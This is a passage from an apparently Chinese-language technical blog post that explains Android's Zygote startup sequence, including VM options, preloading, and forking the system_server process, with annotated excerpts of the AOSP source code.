class="hljs-keyword">bool</span> checkJni = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">property_get</span>(<span class="hljs-string">&quot;dalvik.vm.checkjni&quot;</span>, propBuf, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(propBuf, <span class="hljs-string">&quot;true&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>        checkJni = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(propBuf, <span class="hljs-string">&quot;false&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">property_get</span>(<span class="hljs-string">&quot;ro.kernel.android.checkjni&quot;</span>, propBuf, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">if</span> (propBuf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>            checkJni = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (checkJni) &#123;<br>        <span class="hljs-built_in">addOption</span>(<span class="hljs-string">&quot;-Xcheck:jni&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//虚拟机产生的trace文件，主要用于分析系统问题，路径默认为/data/anr/traces.txt</span><br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.stack-trace-file&quot;</span>, stackTraceFileBuf, <span class="hljs-string">&quot;-Xstacktracefile:&quot;</span>);<br><br>    <span class="hljs-comment">//对于不同的软硬件环境，这些参数往往需要调整、优化，从而使系统达到最佳性能</span><br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heapstartsize&quot;</span>, heapstartsizeOptsBuf, <span class="hljs-string">&quot;-Xms&quot;</span>, <span class="hljs-string">&quot;4m&quot;</span>);<br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heapsize&quot;</span>, heapsizeOptsBuf, <span class="hljs-string">&quot;-Xmx&quot;</span>, <span class="hljs-string">&quot;16m&quot;</span>);<br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heapgrowthlimit&quot;</span>, heapgrowthlimitOptsBuf, <span class="hljs-string">&quot;-XX:HeapGrowthLimit=&quot;</span>);<br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heapminfree&quot;</span>, heapminfreeOptsBuf, <span class="hljs-string">&quot;-XX:HeapMinFree=&quot;</span>);<br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heapmaxfree&quot;</span>, heapmaxfreeOptsBuf, <span class="hljs-string">&quot;-XX:HeapMaxFree=&quot;</span>);<br>    <span class="hljs-built_in">parseRuntimeOption</span>(<span class="hljs-string">&quot;dalvik.vm.heaptargetutilization&quot;</span>,<br>                       heaptargetutilizationOptsBuf, <span class="hljs-string">&quot;-XX:HeapTargetUtilization=&quot;</span>);<br>    ...<br><br>    <span class="hljs-comment">//preloaded-classes文件内容是由WritePreloadedClassFile.java生成的，</span><br>    <span class="hljs-comment">//在ZygoteInit类中会预加载工作将其中的classes提前加载到内存，以提高系统性能</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">hasFile</span>(<span class="hljs-string">&quot;/system/etc/preloaded-classes&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//初始化虚拟机</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">JNI_CreateJavaVM</span>(pJavaVM, pEnv, &amp;initArgs) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">ALOGE</span>(<span class="hljs-string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-8-AndroidRuntime-startReg"><a href="#2-8-AndroidRuntime-startReg" class="headerlink" title="2.8 AndroidRuntime::startReg()"></a>2.8 AndroidRuntime::startReg()</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> AndroidRuntime::start<span class="hljs-constructor">Reg(JNIEnv<span class="hljs-operator">*</span> <span class="hljs-params">env</span>)</span><br>&#123;<br>    <span class="hljs-comment">//设置线程创建方法为javaCreateThreadEtc </span><br>    android<span class="hljs-constructor">SetCreateThreadFunc((<span class="hljs-params">android_create_thread_fn</span>)</span> javaCreateThreadEtc);<br><br>    env-&gt;<span class="hljs-constructor">PushLocalFrame(200)</span>;<br>    <span class="hljs-comment">//进程JNI方法的注册</span><br>    <span class="hljs-keyword">if</span> (register<span class="hljs-constructor">_jni_procs(<span class="hljs-params">gRegJNI</span>, NELEM(<span class="hljs-params">gRegJNI</span>)</span>, env) &lt; <span class="hljs-number">0</span>) &#123;<br>        env-&gt;<span class="hljs-constructor">PopLocalFrame(NULL)</span>;<br>        return -<span class="hljs-number">1</span>;<br>    &#125;<br>    env-&gt;<span class="hljs-constructor">PopLocalFrame(NULL)</span>;<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-9-进入java世界，com-android-internal-os-ZygoteInit-main"><a href="#2-9-进入java世界，com-android-internal-os-ZygoteInit-main" class="headerlink" title="2.9 进入java世界，com.android.internal.os.ZygoteInit#main()"></a>2.9 进入java世界，com.android.internal.os.ZygoteInit#main()</h3><p>源码位于frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span> argv[]) &#123;<br>    <span class="hljs-comment">// 标记Zygote开始初始化，并Hook确保不创建其他线程</span><br>    ZygoteHooks.startZygoteNoThreadCreation();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Trace.traceBegin(Trace.TRACE_TAG_DALVIK, <span class="hljs-string">&quot;ZygoteInit&quot;</span>);<br>        <span class="hljs-comment">//开启DDMS功能</span><br>        RuntimeInit.enableDdms();<br>        <span class="hljs-comment">// Start profiling the zygote initialization.</span><br>        SamplingProfilerIntegration.start();<br><br>        <span class="hljs-keyword">boolean</span> startSystemServer = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">String</span> socketName = <span class="hljs-string">&quot;zygote&quot;</span>;<br>        <span class="hljs-keyword">String</span> abiList = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 解析参数，初始化局部变量</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; argv.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;start-system-server&quot;</span>.equals(argv[i])) &#123;<br>                startSystemServer = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[i].startsWith(ABI_LIST_ARG)) &#123;<br>                abiList = argv[i].substring(ABI_LIST_ARG.length());<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[i].startsWith(SOCKET_NAME_ARG)) &#123;<br>                socketName = argv[i].substring(SOCKET_NAME_ARG.length());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&quot;Unknown command line argument: &quot;</span> + argv[i]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (abiList == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&quot;No ABI list supplied.&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//为Zygote注册socket</span><br>        registerZygoteSocket(socketName);<br>        Trace.traceBegin(Trace.TRACE_TAG_DALVIK, <span class="hljs-string">&quot;ZygotePreload&quot;</span>);<br>        EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,<br>            SystemClock.uptimeMillis());<br>        <span class="hljs-comment">// 预加载类和资源</span><br>        preload(); <br>        EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,<br>            SystemClock.uptimeMillis());<br>        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);<br><br>        <span class="hljs-comment">// Finish profiling the zygote initialization.</span><br>        SamplingProfilerIntegration.writeZygoteSnapshot();<br><br>        <span class="hljs-comment">// Do an initial gc to clean up after startup</span><br>        Trace.traceBegin(Trace.TRACE_TAG_DALVIK, <span class="hljs-string">&quot;PostZygoteInitGC&quot;</span>);<br>        gcAndFinalize();<br>        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);<br><br>        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);<br><br>        <span class="hljs-comment">// Disable tracing so that forked processes do not inherit stale tracing tags from</span><br>        <span class="hljs-comment">// Zygote.</span><br>        Trace.setTracingEnabled(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// Zygote process unmounts root storage spaces.</span><br>        Zygote.nativeUnmountStorageOnInit();<br>        <span class="hljs-comment">// 停止Hook不创建其他线程，也就是说允许创建其他线程</span><br>        ZygoteHooks.stopZygoteNoThreadCreation();<br>        <span class="hljs-comment">// 这里一定是true，启动SystemServer</span><br>        <span class="hljs-keyword">if</span> (startSystemServer) &#123;<br>            startSystemServer(abiList, socketName);<br>        &#125;<br><br>        Log.i(TAG, <span class="hljs-string">&quot;Accepting command socket connections&quot;</span>);<br>        <span class="hljs-comment">// 运行zygote进程的select循环</span><br>        runSelectLoop(abiList);<br><br>        closeServerSocket();<br>    &#125; <span class="hljs-keyword">catch</span> (MethodAndArgsCaller caller) &#123;<br>        <span class="hljs-comment">//捕获异常,并运行run方法</span><br>        caller.run();<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> ex) &#123;<br>        Log.e(TAG, <span class="hljs-string">&quot;Zygote died with exception&quot;</span>, ex);<br>        closeServerSocket();<br>        <span class="hljs-keyword">throw</span> ex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个初始化过程中，做了不少准备工作，更加详细的过程请阅读上述代码注释和源码，我们这里总结以下我们需要着重关注的几件事：</p><ol><li>调用ZygoteServer#registerServerSocket()方法创建一个名为zygote的 Socket 资源</li><li>调用preload预加载资源</li><li>调用ZygoteInit#starSystemServer()方法启动system_server进程</li><li>调用ZygoteInit#runSelectLoop()方法循环接受 Socket 连接，在这里开始和 AMS 搭上边，其实这里就是循环等待 AMS 的连接和命令，更加详细的过程在下文中分析。</li></ol><h3 id="2-10-ZygoteInit-registerZygoteSocket"><a href="#2-10-ZygoteInit-registerZygoteSocket" class="headerlink" title="2.10 ZygoteInit.registerZygoteSocket()"></a>2.10 ZygoteInit.registerZygoteSocket()</h3><p>Socket 是 IPC 通信的一种方式，该 Socket 资源在后期被用在和 AMS 等服务进行进程间通信</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> registerZygoteSocket(<span class="hljs-keyword">String</span> socketName) &#123;<br>        <span class="hljs-keyword">if</span> (sServerSocket == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">int</span> fileDesc;<br>            <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> fullSocketName = ANDROID_SOCKET_PREFIX + socketName;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">String</span> env = System.getenv(fullSocketName);<br>                fileDesc = <span class="hljs-keyword">Integer</span>.parseInt(env);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(fullSocketName + <span class="hljs-string">&quot; unset or invalid&quot;</span>, ex);<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                FileDescriptor fd = <span class="hljs-keyword">new</span> FileDescriptor();<br>                <span class="hljs-comment">//设置文件描述符</span><br>                fd.setInt$(fileDesc); <br>                <span class="hljs-comment">//创建Socket的本地服务端</span><br>                sServerSocket = <span class="hljs-keyword">new</span> LocalServerSocket(fd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<br>                        <span class="hljs-string">&quot;Error binding to local socket &#x27;&quot;</span> + fileDesc + <span class="hljs-string">&quot;&#x27;&quot;</span>, ex);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="2-11-ZygoteInit-preload"><a href="#2-11-ZygoteInit-preload" class="headerlink" title="2.11 ZygoteInit.preload()"></a>2.11 ZygoteInit.preload()</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">static void preload() &#123;<br>   <br>    <br>    <span class="hljs-regexp">//</span>预加载位于<span class="hljs-regexp">/system/</span>etc/preloaded-classes文件中的类<br>    preloadClasses();<br>   <br>    <span class="hljs-regexp">//</span>预加载资源，包含drawable和color资源<br>    preloadResources();<br>   <br>    <span class="hljs-regexp">//</span>预加载OpenGL<br>    preloadOpenGL();<br>  <br>    <span class="hljs-regexp">//</span>通过System.loadLibrary()方法，<br>    <span class="hljs-regexp">//</span>预加载<span class="hljs-string">&quot;android&quot;</span>,<span class="hljs-string">&quot;compiler_rt&quot;</span>,<span class="hljs-string">&quot;jnigraphics&quot;</span>这<span class="hljs-number">3</span>个共享库<br>    preloadSharedLibraries();<br>    <span class="hljs-regexp">//</span>预加载  文本连接符资源<br>    preloadTextResources();<br>   <br>    <span class="hljs-regexp">//</span>仅用于zygote进程，用于内存共享的进程<br>    WebViewFactory.prepareWebViewInZygote();<br> <br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行Zygote进程的初始化,对于类加载，采用反射机制Class.forName()方法来加载。对于资源加载，主要是 com.android.internal.R.array.preloaded_drawables和com.android.internal.R.array.preloaded_color_state_lists，在应用程序中以com.android.internal.R.xxx开头的资源，便是此时由Zygote加载到内存的</p><h3 id="2-11-ZygoteInit-startSystemServer"><a href="#2-11-ZygoteInit-startSystemServer" class="headerlink" title="2.11 ZygoteInit.startSystemServer()"></a>2.11 ZygoteInit.startSystemServer()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">boolean</span> startSystemServer(<span class="hljs-keyword">String</span> abiList, <span class="hljs-keyword">String</span> socketName)<br>        throws MethodAndArgsCaller, <span class="hljs-built_in">RuntimeException</span> &#123;<br>    <span class="hljs-comment">//参数准备</span><br>    <span class="hljs-keyword">String</span> args[] = &#123;<br>        <span class="hljs-string">&quot;--setuid=1000&quot;</span>,<br>        <span class="hljs-string">&quot;--setgid=1000&quot;</span>,<br>        <span class="hljs-string">&quot;--setgroups=1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1018,1021,1032,3001,3002,3003,3006,3007,3009,3010&quot;</span>,<br>        <span class="hljs-string">&quot;--capabilities=&quot;</span> + capabilities + <span class="hljs-string">&quot;,&quot;</span> + capabilities,<br>        <span class="hljs-string">&quot;--nice-name=system_server&quot;</span>,  <span class="hljs-comment">// 指定进程名字 system_server</span><br>        <span class="hljs-string">&quot;--runtime-args&quot;</span>,<br>        <span class="hljs-string">&quot;com.android.server.SystemServer&quot;</span>,<br>    &#125;;<br>    ZygoteConnection.Arguments parsedArgs = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">int</span> pid;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//用于解析参数，生成目标格式</span><br>        parsedArgs = <span class="hljs-keyword">new</span> ZygoteConnection.Arguments(args);<br>        ZygoteConnection.applyDebuggerSystemProperty(parsedArgs);<br>        ZygoteConnection.applyInvokeWithSystemProperty(parsedArgs);<br><br>      <br>        <span class="hljs-comment">// 从zygote进程fork system_server进程</span><br>        pid = Zygote.forkSystemServer(<br>                parsedArgs.uid, parsedArgs.gid,<br>                parsedArgs.gids,<br>                parsedArgs.debugFlags,<br>                <span class="hljs-literal">null</span>,<br>                parsedArgs.permittedCapabilities,<br>                parsedArgs.effectiveCapabilities);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(ex);<br>    &#125;<br><br>    <span class="hljs-comment">//进入子进程system_server</span><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//第二个zygote进程</span><br>        <span class="hljs-keyword">if</span> (hasSecondZygote(abiList)) &#123;<br>            waitForSecondaryZygote(socketName);<br>        &#125;<br>        <span class="hljs-comment">// 完成system_server进程剩余的工作</span><br>        handleSystemServerProcess(parsedArgs);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法先准备参数，然后fork新进程，对于有两个zygote进程情况，需等待第2个zygote创建完成</p><h3 id="2-12-Zygote-forkSystemServer"><a href="#2-12-Zygote-forkSystemServer" class="headerlink" title="2.12 Zygote.forkSystemServer()"></a>2.12 Zygote.forkSystemServer()</h3><p>源码位于frameworks/base/core/java/com/android/internal/os/Zygote.java</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">forkSystemServer</span><span class="hljs-params">(<span class="hljs-keyword">int</span> uid, <span class="hljs-keyword">int</span> gid, <span class="hljs-keyword">int</span>[] gids, <span class="hljs-keyword">int</span> debugFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">int</span>[][] rlimits, <span class="hljs-keyword">long</span> permittedCapabilities, <span class="hljs-keyword">long</span> effectiveCapabilities)</span> </span>&#123;<br>        VM_HOOKS.<span class="hljs-built_in">preFork</span>();<br>        <span class="hljs-comment">// 调用native方法fork system_server进程</span><br>        <span class="hljs-keyword">int</span> pid = <span class="hljs-built_in">nativeForkSystemServer</span>(<br>                uid, gid, gids, debugFlags, rlimits, permittedCapabilities, effectiveCapabilities);<br>        <span class="hljs-comment">// Enable tracing as soon as we enter the system_server.</span><br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            Trace.<span class="hljs-built_in">setTracingEnabled</span>(<span class="hljs-literal">true</span>);<br>        &#125;<br>        VM_HOOKS.<span class="hljs-built_in">postForkCommon</span>();<br>        <span class="hljs-keyword">return</span> pid;<br>    &#125;<br></code></pre></td></tr></table></figure><p>nativeForkSystemServer()方法在AndroidRuntime.cpp中注册的，调用com_android_internal_os_Zygote.cpp中的register_com_android_internal_os_Zygote()方法建立native方法的映射关系，所以接下来进入如下方法<br>com_android_internal_os_Zygote.nativeForkSystemServer</p><h3 id="2-13-com-android-internal-os-Zygote-nativeForkSystemServer"><a href="#2-13-com-android-internal-os-Zygote-nativeForkSystemServer" class="headerlink" title="2.13 com_android_internal_os_Zygote.nativeForkSystemServer()"></a>2.13 com_android_internal_os_Zygote.nativeForkSystemServer()</h3><p>源码位于 frameworks/base/core/jni/com_android_internal_os_Zygote.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> jint <span class="hljs-title">com_android_internal_os_Zygote_nativeForkSystemServer</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv* env, jclass, <span class="hljs-keyword">uid_t</span> uid, <span class="hljs-keyword">gid_t</span> gid, jintArray gids,</span></span><br><span class="hljs-params"><span class="hljs-function">        jint debug_flags, jobjectArray rlimits, jlong permittedCapabilities,</span></span><br><span class="hljs-params"><span class="hljs-function">        jlong effectiveCapabilities)</span> </span>&#123;<br>  <span class="hljs-comment">//fork子进程</span><br>  <span class="hljs-keyword">pid_t</span> pid = <span class="hljs-built_in">ForkAndSpecializeCommon</span>(env, uid, gid, gids,<br>                                      debug_flags, rlimits,<br>                                      permittedCapabilities, effectiveCapabilities,<br>                                      MOUNT_EXTERNAL_DEFAULT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">NULL</span>,<br>                                      <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// zygote进程，检测system_server进程是否创建</span><br>      gSystemServerPid = pid;<br>    <br>      <span class="hljs-keyword">int</span> status;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">waitpid</span>(pid, &amp;status, WNOHANG) == pid) &#123;<br>          <span class="hljs-comment">//当system_server进程死亡后，重启zygote进程</span><br>          <span class="hljs-built_in">RuntimeAbort</span>(env, __LINE__, <span class="hljs-string">&quot;System server process has died. Restarting Zygote!&quot;</span>);<br>      &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>当system_server进程创建失败时，将会重启zygote进程。这里需要注意，对于Android 5.0以上系统，有两个zygote进程，分别是zygote、zygote64两个进程，system_server的父进程，一般来说64位系统其父进程是zygote64进程</p><ul><li>当kill system_server进程后，只重启zygote64和system_server，不重启zygote;</li><li>当kill zygote64进程后，只重启zygote64和system_server，也不重启zygote；</li><li>当kill zygote进程，则重启zygote、zygote64以及system_server。</li></ul><h3 id="2-14-com-android-internal-os-Zygote-ForkAndSpecializeCommon"><a href="#2-14-com-android-internal-os-Zygote-ForkAndSpecializeCommon" class="headerlink" title="2.14 com_android_internal_os_Zygote.ForkAndSpecializeCommon()"></a>2.14 com_android_internal_os_Zygote.ForkAndSpecializeCommon()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> pid_t ForkAndSpecializeCommon(JNIEnv* env, uid_t uid, gid_t gid, jintArray javaGids,<br>                                     jint debug_flags, jobjectArray javaRlimits,<br>                                     jlong permittedCapabilities, jlong effectiveCapabilities,<br>                                     jint mount_external,<br>                                     jstring java_se_info, jstring java_se_name,<br>                                     <span class="hljs-keyword">bool</span> is_system_server, jintArray fdsToClose,<br>                                     jstring instructionSet, jstring dataDir) &#123;<br>  SetSigChldHandler(); <span class="hljs-comment">//设置子进程的signal信号处理函数</span><br>  pid_t pid = fork(); <span class="hljs-comment">//fork子进程</span><br>  <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>    <span 